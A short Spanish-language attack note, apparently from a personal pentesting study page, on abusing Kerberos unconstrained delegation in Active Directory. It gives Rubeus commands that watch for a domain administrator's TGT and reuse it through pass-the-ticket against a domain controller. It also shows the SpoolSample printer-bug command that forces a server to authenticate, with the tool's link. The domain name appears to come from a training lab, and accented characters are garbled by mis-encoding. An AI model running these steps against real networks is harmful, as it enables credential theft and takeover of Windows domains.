# Sobre computadoras

## Esperando la autenticaci칩n de un usuario privilegiado

Si logramos comprometer un servidor que tiene habilitada la Unconstrained delegation, y posteriormente un administrador de dominio inicia sesi칩n, podremos extraer su TGT y usarlo para movernos lateralmente y comprometer otras m치quinas, incluidos los controladores de dominio.

Rubeus es la herramienta ideal para este ataque. Como administrador local, Rubeus puede ejecutarse para supervisar los tickets almacenados. Si se encuentra un TGT en un ticket TGS, Rubeus nos lo mostrar치.

### 1)Monitoreo de tickets
Ponemos a Rubeus en modo monitoreo esperando que los usuarios se conecten al servidor.

    .\Rubeus.exe monitor /interval:5 /nowrap

### 2) Usamos el ticket para pediro otro ticket con otro servicio


    .\Rubeus.exe asktgs /ticket:<ticket> /service:<servicio>/dc01.INLANEFREIGHT.local /ptt

Si esto no funciona:

    .\Rubeus.exe renew /ticket:<ticket> /ptt

Ahora podemos aprovechar este ticket para realizar acciones en el dc01 como el usuario privilegiado.

## Aprovechando el error de impresora


Es muy similar a la anterior, simplemente que aprovechamos una falla en el MS-RPRN (Print system remote protocol) que puede obligar a un servidor a autenticarse frente a otro


Para esto utilizaremos la herramienta: **SpoolSample**:

    https://github.com/leechristensen/SpoolSample

### 1) Ponemos el rubeus en modo monitor:

    .\Rubeus.exe monitor /interval:5 /nowrap

### 2) Corremos SpoolSample

    .\SpoolSample.exe <target> <our_server>

### 3) Conseguimos el ticket y continueamos con el ataque anterior.



